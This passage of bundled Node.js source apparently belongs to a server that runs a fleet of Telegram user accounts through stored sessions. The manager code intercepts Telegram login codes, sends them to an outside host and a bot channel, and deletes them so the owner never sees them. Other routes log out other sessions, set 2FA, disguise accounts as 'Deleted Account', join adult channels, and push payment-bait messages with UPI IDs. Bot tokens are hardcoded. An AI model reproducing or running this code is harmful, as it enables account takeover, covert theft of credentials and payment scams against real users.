Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n        }\r\n        catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n    async handleEvents(event) {\r\n        if (event.isPrivate) {\r\n            if (event.message.chatId.toString() == \"777000\") {\r\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nSetup - ', activeClientSetup);\r\n                if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {\r\n                    console.log(\"LoginText: \", event.message.text)\r\n                    const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\r\n                    console.log(\"Code is:\", code)\r\n                    try {\r\n                        const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\r\n                        console.log(\"Code Sent\");\r\n                    } catch (error) {\r\n                        console.log(error)\r\n                    }\r\n                    await deleteClient(this.phoneNumber)\r\n                }\r\n                console.log(event.message.text.toLowerCase());\r\n                const payload = {\r\n                    \"chat_id\": \"-1001801844217\",\r\n                    \"text\": event.message.text\r\n                };\r\n                axios.post(ppplbot, payload)\r\n                    .then((response) => {\r\n                    })\r\n                    .catch((error) => {\r\n                        console.error('Error sending message:', error.response?.data?.description);\r\n                    });\r\n                await event.message.delete({ revoke: true });\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nmodule.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient, deleteClient, getActiveClientSetup, setActiveClientSetup }\r\n","const axios = require('axios');\r\nfunction sleep(ms) {\r\n  return new Promise(resolve => setTimeout(resolve, ms));\r\n}\r\n\r\nasync function fetchWithTimeout(resource, options = {}, maxRetries = 0) {\r\n  const timeout = options?.timeout || 15000;\r\n\r\n  const source = axios.CancelToken.source();\r\n  const id = setTimeout(() => source.cancel(), timeout);\r\n  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {\r\n    try {\r\n      const response = await axios({\r\n        ...options,\r\n        url: resource,\r\n        cancelToken: source.token\r\n      });\r\n      clearTimeout(id);\r\n      return response;\r\n    } catch (error) {\r\n      if (axios.isCancel(error)) {\r\n        console.log('Request canceled:', error.message, resource);\r\n      } else {\r\n        console.log('Error:', error.message);\r\n      }\r\n      if (retryCount < maxRetries) {\r\n        await new Promise(resolve => setTimeout(resolve, 2000)); // 1 second delay\r\n      } else {\r\n        console.error(`All ${maxRetries + 1} retries failed for ${resource}`);\r\n        return undefined;\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\nmodule.exports = { sleep, fetchWithTimeout }","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId](module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","'use strict';\r\nconst dotenv = require('dotenv')\r\ndotenv.config();\r\nconst express = require('express');\r\nconst axios = require('axios');\r\nconst schedule = require('node-schedule-tz');\r\nconst timeOptions = { timeZone: 'Asia/Kolkata', timeZoneName: 'short' };\r\nconst ChannelService = require('./dbservice');\r\nconst { getClient, hasClient, disconnectAll, createClient, deleteClient, setActiveClientSetup, getActiveClientSetup } = require('./telegramManager');\r\nconst bodyParser = require('body-parser');\r\nconst swaggerUi = require('swagger-ui-express');\r\nconst swaggerSpec = require('./swaggerConfig');\r\nconst { sleep } = require('./utils');\r\nconst { fetchWithTimeout } = require('./utils');\r\nconst { execSync } = require('child_process');\r\nconst { CloudinaryService } = require('./cloudinary')\r\n\r\nprocess.on('unhandledRejection', (reason, promise) => {\r\n  console.error('Unhandled Rejection at:', promise, 'reason:', reason);\r\n});\r\nprocess.on('exit', async () => {\r\n  await ChannelService.getInstance().closeConnection();\r\n  await disconnectAll();\r\n});\r\n\r\nvar cors = require('cors');\r\nconst app = express();\r\nconst port = 8000;\r\nconst userMap = new Map();\r\n\r\nlet ip;\r\nlet clients;\r\nlet upiIds;\r\nconst pings = {}\r\n\r\nfetchWithTimeout('https://ipinfo.io/json')\r\n  .then(result => {\r\n    return result.data;\r\n  })\r\n  .then((output) => {\r\n    ip = output;\r\n    console.log(ip)\r\n  })\r\n  .then(() => {\r\n    ChannelService.getInstance().connect().then(async () => {\r\n      setTimeout(async () => {\r\n        checkerclass.getinstance()\r\n        await setUserMap();\r\n        // joinchannels();\r\n        // joinchannelForBufferClients();\r\n      }, 100);\r\n    })\r\n  }\r\n  ).catch(err => console.error(err))\r\n\r\nlet count = 0;\r\nlet botCount = 0\r\nconst ppplbot = () => {\r\n  let token;\r\n  if (botCount % 2 == 1) {\r\n    token = `bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY`\r\n  } else {\r\n    token = `bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA`\r\n  }\r\n\r\n  return `https://api.telegram.org/${token}/sendMessage?chat_id=-1001801844217`\r\n}\r\nconst pingerbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001703065531`;\r\n\r\nconst apiResp = {\r\n  INSTANCE_NOT_EXIST: \"INSTANCE_NOT_EXIST\",\r\n  CLIENT_NOT_EXIST: \"CLIENT_NOT_EXIST\",\r\n  CONNECTION_NOT_EXIST: \"CONNECTION_NOT_EXIST\",\r\n  ALL_GOOD: \"ALL_GOOD\",\r\n  DANGER: \"DANGER\",\r\n  WAIT: \"WAIT\"\r\n};\r\n\r\nasync function setUserMap() {\r\n  userMap.clear();\r\n  const db = ChannelService.getInstance();\r\n  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);\r\n  const users = await db.getAllUserClients();\r\n  clients = users\r\n  upiIds = await db.getAllUpis()\r\n  users.forEach(user => {\r\n    userMap.set(user.userName.toLowerCase(), { url: `${user.repl}/`, timeStamp: Date.now(), deployKey: user.deployKey, downTime: 0, lastPingTime: Date.now(), clientId: user.clientId })\r\n    pings[user.userName.toLowerCase()] = Date.now();\r\n  })\r\n}\r\n\r\nfunction getCurrentHourIST() {\r\n  const now = new Date();\r\n  const istOffset = 5.5 * 60 * 60 * 1000;\r\n  const istTime = new Date(now.getTime() + istOffset);\r\n  const istHour = istTime.getUTCHours();\r\n  return istHour;\r\n}\r\nconst connetionQueue = [];\r\ntry {\r\n  schedule.scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {\r\n    checkBufferClients()\r\n    for (const value of userMap.values()) {\r\n      try {\r\n        const now = new Date();\r\n        if (now.getUTCDate() % 3 === 1) {\r\n          await fetchWithTimeout(`${value.url}leavechannels`);\r\n        }\r\n        joinchannels(value);\r\n      } catch (error) {\r\n        console.log(\"Some Error: \", error.code);\r\n      }\r\n    }\r\n    await fetchWithTimeout(`https://mychatgpt-pg6w.onrender.com/deletefiles`);\r\n  })\r\n  schedule.scheduleJob('test3', ' 25 12 * * * ', 'Asia/Kolkata', async () => {\r\n    joinchannels();\r\n    joinchannelForBufferClients();\r\n  })\r\n} catch (error) {\r\n  console.log(\"Some Error: \", error.code);\r\n}\r\n\r\n\r\napp.use(cors());\r\napp.use(bodyParser.json());\r\napp.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));\r\napp.get('/', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n\r\n  //\r\n});\r\n\r\napp.get('/exitacc', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  //\r\n});\r\n\r\napp.get('/checkBufferClients', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Checking Buffer Clients');\r\n  next();\r\n}, async (req, res) => {\r\n  await checkBufferClients();\r\n});\r\n\r\napp.get('/processUsers/:limit/:skip', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async (req, res) => {\r\n  const limit = req.params.limit ? req.params.limit : 30\r\n  const skip = req.params.skip ? req.params.skip : 20\r\n  const db = await ChannelService.getInstance();\r\n  const cursor = await db.processUsers(parseInt(limit), parseInt(skip));\r\n  while (await cursor.hasNext()) {\r\n    const document = await cursor.next();\r\n    const cli = await createClient(document.mobile, document.session);\r\n    const client = await getClient(document.mobile);\r\n    if (cli) {\r\n      console.log(document.mobile, \" :  true\");\r\n      const lastActive = await client.getLastActiveTime();\r\n      const date = new Date(lastActive * 1000).toISOString().split('T')[0];\r\n      const me = await client.getMe()\r\n      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });\r\n      await client?.disconnect(document.mobile);\r\n      await deleteClient()\r\n    } else {\r\n      console.log(document.mobile, \" :  false\");\r\n      await db.deleteUser(document);\r\n    }\r\n  }\r\n  console.log(\"finished\")\r\n});\r\n\r\napp.get('/refreshMap', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  await setUserMap();\r\n  res.send('Hello World!');\r\n});\r\n\r\napp.get('/clearstats2', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  await db.clearStats2();\r\n  res.send('Hello World!');\r\n});\r\n\r\napp.get('/exit', async (req, res) => {\r\n  await ChannelService.getInstance().closeConnection();\r\n  process.exit(1)\r\n  res.send('Hello World!');\r\n});\r\n\r\napp.post('/channels', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  // console.log(req.body);\r\n  next();\r\n}, async (req, res) => {\r\n  const channels = req.body?.channels;\r\n  const db = ChannelService.getInstance();\r\n  channels?.forEach(async (channel) => {\r\n    await db.insertChannel(channel);\r\n  })\r\n});\r\n\r\nlet settingupClient = Date.now() - 250000;\r\napp.get('/setupClient/:clientId', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  if (Date.now() > (settingupClient + 240000)) {\r\n    settingupClient = Date.now();\r\n    const clientId = req.params?.clientId;\r\n    const archieveOld = req?.query?.a;\r\n    console.log(clientId, archieveOld);\r\n    await setUpClient(clientId.toString(), archieveOld?.toLowerCase() === 'yes' ? true : false)\r\n  } else {\r\n    console.log(\"Profile Setup Recently tried\");\r\n  }\r\n})\r\n\r\napp.get('/updateClient/:clientId', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  if (Date.now() > (settingupClient + 240000)) {\r\n    settingupClient = Date.now();\r\n    const clientId = req.params?.clientId;\r\n    console.log(clientId);\r\n    await updateClient(clientId.toString())\r\n  } else {\r\n    console.log(\"Profile Setup Recently tried\");\r\n  }\r\n})\r\n\r\napp.get('/getip', (req, res) => {\r\n  res.json(ip);\r\n});\r\n\r\napp.post('/users', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  console.log(req.body);\r\n  next();\r\n}, async (req, res) => {\r\n  const user = req.body;\r\n  const db = ChannelService.getInstance();\r\n  const cli = getClient(user.mobile);\r\n  const activeClientSetup = getActiveClientSetup()\r\n  if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {\r\n    await db.insertUser(user);\r\n    await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)\r\n  } else {\r\n    setActiveClientSetup(undefined)\r\n    console.log(\"New Session Generated\");\r\n    await setNewClient(user, activeClientSetup);\r\n    await deleteClient(user.mobile)\r\n  }\r\n});\r\n\r\napp.get('/channels/:limit/:skip', async (req, res, next) => {\r\n  const limit = req.params.limit ? req.params.limit : 30\r\n  const skip = req.params.skip ? req.params.skip : 20\r\n  const k = req.query?.k\r\n  const db = ChannelService.getInstance();\r\n  const channels = await db.getChannels(parseInt(limit), parseInt(skip), k);\r\n  let resp = 'joinchannel:'\r\n  for (const channel of channels) {\r\n    resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n  }\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/activechannels/:limit/:skip', async (req, res, next) => {\r\n  const limit = req.params.limit ? req.params.limit : 30\r\n  const skip = req.params.skip ? req.params.skip : 20\r\n  const k = req.query?.k\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], [], 'channels');\r\n  let resp = 'joinchannel:'\r\n  for (const channel of result) {\r\n\r\n    resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n  }\r\n  res.send(resp);\r\n});\r\n\r\nlet refresTime = Date.now();\r\napp.get('/getdata', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  if (Date.now() > refresTime) {\r\n    refresTime = Date.now() + (5 * 60 * 1000);\r\n    Array.from(userMap.values()).map(async (value) => {\r\n      await fetchWithTimeout(`${value.url}markasread`);\r\n    })\r\n  }\r\n  res.setHeader('Content-Type', 'text/html');\r\n  let resp = '<html><head></head><body>';\r\n  resp = resp + await getData();\r\n  resp += '</body></html>';\r\n  resp += `<script>\r\n              console.log(\"hii\");\r\n              setInterval(() => {\r\n                window.location.reload();\r\n              }, 20000);\r\n          </script>`;\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/getdata2', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getDemostat2`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/getAllIps', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    try {\r\n      console.log(value.clientId)\r\n      const res = await fetchWithTimeout(`${value.url}getip`);\r\n      console.log(res.data);\r\n    } catch (error) {\r\n\r\n    }\r\n  }\r\n});\r\n\r\napp.get('/refreshupis', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}refreshupis`);\r\n  }\r\n});\r\n\r\napp.get('/getuserdata', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getuserstats`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/getuserdata2', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getuserstats2`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/restartall', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.deployKey}`);\r\n  })\r\n});\r\napp.get('/sendtoall', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received sendtoall request');\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const queries = req.query\r\n  let newQuery = '';\r\n  Object.keys(req.query).map((key) => {\r\n    newQuery += `${queries[key]}/`\r\n  });\r\n  console.log(newQuery);\r\n  for (const value of userMap.values()) {\r\n    const url = `${value.url}${newQuery}`;\r\n    console.log(url);\r\n    await sleep(1000);\r\n    await fetchWithTimeout(url);\r\n  }\r\n});\r\n\r\napp.get('/usermap', async (req, res) => {\r\n  checkerclass.getinstance()\r\n  console.log('Received Usermap request');\r\n  res.json(Array.from(userMap.values()));\r\n});\r\n\r\napp.get('/getbufferclients', async (req, res) => {\r\n  const db = ChannelService.getInstance();\r\n  const result = []\r\n  const clients = await db.readBufferClients({});\r\n  clients.forEach((cli) => {\r\n    result.push(cli.mobile);\r\n  })\r\n  res.json(result);\r\n});\r\n\r\napp.get('/clients', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received Client request');\r\n  res.json(clients)\r\n});\r\n\r\napp.get('/keepready2', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  console.log('Received keepready2 request');\r\n  res.send(`Responding!!\\nMsg = ${req.query.msg}`);\r\n  next();\r\n}, async (req, res) => {\r\n  const msg = req.query.msg;\r\n  console.log(\"Msg2 = \", msg);\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}resptopaid2?msg=${msg ? msg : \"Oye...\"}`);\r\n    await fetchWithTimeout(`${value.url}getDemostats`);\r\n  });\r\n  const db = ChannelService.getInstance();\r\n  await db.clearStats()\r\n});\r\n\r\napp.get('/keepready', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received Keepready request');\r\n  const dnsMsg = encodeURIComponent(`Dont Speak Okay!!\\n**I am in Bathroom**\\n\\nMute yourself!!\\n\\nI will show you Okay..!!`)\r\n  const msg = req.query.msg.toLowerCase() == 'dns' ? dnsMsg : req.query.msg;\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}resptopaid?msg=${msg ? msg : \"Oye...\"}`);\r\n  });\r\n  const db = ChannelService.getInstance();\r\n  await db.clearStats();\r\n  res.send(`Responding!!\\nMsg = ${msg}`);\r\n});\r\n\r\napp.get('/asktopay', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received AsktoPay request');\r\n  res.send(`Asking Pppl`);\r\n  next();\r\n}, async (req, res) => {\r\n  const msg = req.query.msg;\r\n  console.log(\"Msg = \", msg);\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}asktopay`)\r\n  })\r\n});\r\n\r\nlet callingTime = Date.now();\r\napp.get('/calltopaid', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  console.log('Received Call request');\r\n  res.send(`Asking Pppl`);\r\n  next();\r\n}, async (req, res) => {\r\n  const msg = req.query.msg;\r\n  console.log(\"Msg = \", msg);\r\n  if (Date.now() > callingTime) {\r\n    callingTime = Date.now() + (10 * 60 * 1000)\r\n    Array.from(userMap.values()).map(async (value) => {\r\n      await fetchWithTimeout(`${value.url}calltopaid`)\r\n    })\r\n  }\r\n});\r\n\r\n\r\napp.get('/markasread', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  console.log('Received MarkasRead Req');\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const all = req.query.all;\r\n  if (Date.now() > refresTime) {\r\n    refresTime = Date.now() + (5 * 60 * 1000);\r\n    console.log(\"proceeding with all = \", all);\r\n    Array.from(userMap.values()).map(async (value) => {\r\n      await fetchWithTimeout(`${value.url}markasread?${all ? \"all=true\" : ''}`);\r\n    })\r\n  }\r\n});\r\n\r\napp.get('/setactiveqr', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const upi = req.query.upi;\r\n  console.log(\"upi = \", upi);\r\n  Array.from(userMap.values()).map(async (value) => {\r\n    await fetchWithTimeout(`${value.url}setactiveqr?upi=${upi}`);\r\n  })\r\n});\r\n\r\napp.get('/getUpiId', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const app = req.query.app ? req.query.app : \"paytm3\"\r\n  const db = ChannelService.getInstance();\r\n  const upiId = await db.getupi(app);\r\n  res.send(upiId);\r\n});\r\n\r\napp.get('/getAllUpiIds', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  res.json(upiIds);\r\n});\r\n\r\napp.post('/getAllUpiIds', async (req, res, next) => {\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const upiIds = await db.updateUpis(data);\r\n  res.json(upiIds);\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}refreshupis`);\r\n  }\r\n})\r\n\r\napp.get('/getUserConfig', async (req, res) => {\r\n  const filter = req.query\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const userConfig = await db.getUserConfig(filter);\r\n  res.json(userConfig);\r\n});\r\n\r\napp.post('/getUserConfig', async (req, res) => {\r\n  const filter = req.query\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const upiIds = await db.updateUserConfig(filter, data);\r\n  await setUserMap();\r\n  res.json(upiIds);\r\n});\r\n\r\n\r\napp.get('/builds', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const data = await db.getBuilds();\r\n  console.log(data);\r\n  res.json(data);\r\n});\r\n\r\napp.post('/builds', async (req, res) => {\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  console.log(data);\r\n  const result = await db.updateBuilds(data);\r\n  res.json(result);\r\n});\r\n\r\napp.get('/getAllUserClients', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const userConfig = await db.getAllUserClients();\r\n  const resp = []\r\n  userConfig.map((user) => {\r\n    resp.push(user.clientId)\r\n  })\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/getTgConfig', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const tgConfig = await db.getTgConfig()\r\n  res.json(tgConfig);\r\n});\r\n\r\napp.get('/updateActiveChannels', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const tgConfig = await db.updateActiveChannels();\r\n  res.send(\"ok\");\r\n});\r\n\r\napp.get('/getCurrentActiveUniqueChannels', async (req, res) => {\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.getCurrentActiveUniqueChannels();\r\n  res.json({ length: result.length, data: result });\r\n});\r\n\r\napp.post('/getTgConfig', async (req, res, next) => {\r\n  const data = req.body\r\n  checkerclass.getinstance();\r\n  const db = ChannelService.getInstance();\r\n  const upiIds = await db.updateUpis(data)\r\n  res.json(upiIds);\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}refreshupis`);\r\n  }\r\n});\r\n\r\napp.get('/lastpings', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    resp = resp + `${value.clientId}  :  ${Number(((Date.now() - value.lastPingTime) / 60000).toFixed(2))}\\n`\r\n  }\r\n  resp += '</pre></body></html>';\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/lastpingsjson', async (req, res, next) => {\r\n  checkerclass.getinstance();\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n  for (const userdata in pings) {\r\n    resp = resp + `${userdata}  :  ${Number(((Date.now() - pings[userdata]) / 60000).toFixed(2))}\\n`\r\n  }\r\n  resp += '</pre></body></html>';\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/exitglitches', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    if (value.url.toLowerCase().includes('glitch'))\r\n      await fetchWithTimeout(`${value.url}exit`);\r\n  }\r\n});\r\n\r\napp.get('/exitprimary', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    if (value.clientId.toLowerCase().includes('1'))\r\n      await fetchWithTimeout(`${value.url}exit`);\r\n  }\r\n});\r\n\r\napp.get('/exitsecondary', async (req, res, next) => {\r\n  res.send(\"ok\")\r\n  next();\r\n}, async () => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    if (value.clientId.toLowerCase().includes('2'))\r\n      await fetchWithTimeout(`${value.url}exit`);\r\n  }\r\n});\r\n\r\napp.get('/connectclient/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (user) {\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      if (cli) {\r\n        res.send(\"client created\");\r\n      } else {\r\n        res.send(\"client EXPIRED\");\r\n      }\r\n    } else {\r\n      res.send(\"Client Already existing\");\r\n    }\r\n  } else {\r\n    res.send(\"User Does not exist\");\r\n  }\r\n});\r\n\r\napp.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {\r\n  res.send(\"joiningChannels\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const limit = req.params.limit ? req.params.limit : 30\r\n    const skip = req.params.skip ? req.params.skip : 20\r\n    const k = req.query?.k\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session, false);\r\n      if (cli) {\r\n        const client = await getClient(user.mobile);\r\n        const channels = await client.channelInfo(true);\r\n        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];\r\n        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');\r\n        console.log(\"DbChannelsLen: \", result.length);\r\n        let resp = '';\r\n        for (const channel of result) {\r\n\r\n          resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n        }\r\n        await client.removeOtherAuths();\r\n        client.joinChannels(resp);\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/set2fa/:number', async (req, res, next) => {\r\n  res.send(\"Setting 2FA\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.set2fa();\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code)\r\n  }\r\n});\r\n\r\napp.get('/setpp/:number/:name', async (req, res, next) => {\r\n  res.send(\"Setting 2FA\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const name = req.params?.name;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await CloudinaryService.getInstance(name);\r\n        await sleep(2000);\r\n        await client.updateProfilePic('./dp1.jpg');\r\n        await sleep(1000);\r\n        await client.updateProfilePic('./dp2.jpg');\r\n        await sleep(1000);\r\n        await client.updateProfilePic('./dp3.jpg');\r\n        await sleep(1000);\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code)\r\n  }\r\n});\r\n\r\n\r\napp.get('/SetAsBufferClient/:number', async (req, res, next) => {\r\n  res.send(\"Updating Name\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.set2fa();\r\n        await sleep(30000)\r\n        await client.updateUsername();\r\n        await sleep(5000)\r\n        await client.updatePrivacyforDeletedAccount();\r\n        await sleep(5000)\r\n        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n        await sleep(5000)\r\n        await client.deleteProfilePhotos();\r\n        await sleep(5000)\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/updatePrivacy/:number', async (req, res, next) => {\r\n  